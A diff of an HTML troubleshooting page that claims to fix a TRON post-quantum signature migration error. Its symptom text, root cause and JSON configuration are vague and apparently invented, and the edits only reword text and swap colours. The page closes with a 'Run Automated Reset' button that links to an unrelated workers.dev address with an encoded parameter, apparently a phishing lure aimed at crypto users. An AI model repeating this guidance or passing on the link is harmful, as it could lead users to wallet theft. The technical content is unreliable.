@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Error – Fix Guide</title>
+<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Failed – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,37 +39,38 @@
 </head>
 <body>
 <div class="content">
-<h1>TRON Post-Quantum Signature Migration Error</h1>
+<h1>TRON Post-Quantum Signature Migration Failed</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter issues when attempting to migrate to post-quantum signatures on the TRON network using java-tron, resulting in failed transactions and error messages indicating incompatible signature schemes.</li>
+<li>Users are experiencing issues with the TRON post-quantum signature migration, resulting in failed transactions and errors when attempting to interact with the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the mismatch between the traditional elliptic curve cryptography used currently and the newly introduced post-quantum cryptography, which requires an update in the java-tron implementation to support both schemes seamlessly.</li>
+<li>The error occurs due to incompatibility between the existing TRON network infrastructure and the newly introduced post-quantum signature scheme, which is designed to provide enhanced security against quantum computer attacks.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Update java-tron to the latest version supporting post-quantum signatures.</li>
-<li>Configure the node to use a hybrid mode that supports both traditional and post-quantum signatures.</li>
-<li>Implement a custom solution using the following json configuration:</li>
+<li>Update the Java-Tron node to the latest version</li>
+<li>Configure the node to use the post-quantum signature scheme</li>
+<li>Use the following JSON configuration to enable post-quantum signatures:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;postQuantum&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;hybridMode&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;traditionalCurve&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;secp256k1&quot;</span>
+<span class="w">  </span><span class="nt">&quot;postQuantum&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SPHINCS&quot;</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex configurations. </p>
+<p>Consider utilizing an external console for more complex configurations, such as <code>tron-console</code>, to streamline the process.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Latest version of java-tron installed</li>
-<li>Node configured for hybrid signature mode</li>
-<li>Understanding of post-quantum cryptography principles</li>
+<li>Java-Tron node installed and running</li>
+<li>TRON network account with sufficient balance</li>
+<li>Latest version of the Java-Tron software package</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">java-tron [Feature] TRON Post-Quantum Signature Migration</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
